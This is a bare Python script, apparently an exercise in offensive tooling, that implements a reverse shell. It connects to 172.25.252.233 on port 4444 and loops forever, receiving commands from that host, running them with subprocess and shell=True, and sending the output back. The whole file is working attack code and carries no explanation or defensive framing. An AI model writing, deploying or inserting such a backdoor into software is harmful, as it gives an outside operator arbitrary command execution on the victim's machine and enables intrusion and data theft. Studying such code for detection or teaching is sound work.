import socket
import subprocess

connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

connection.connect(('172.25.252.233', 4444))
connection.send(b'Hello, Server! \n')

while True:
    command = connection.recv(1024)
    command_result = execute_system_command(command)
    connection.send(command_result)


connection.close()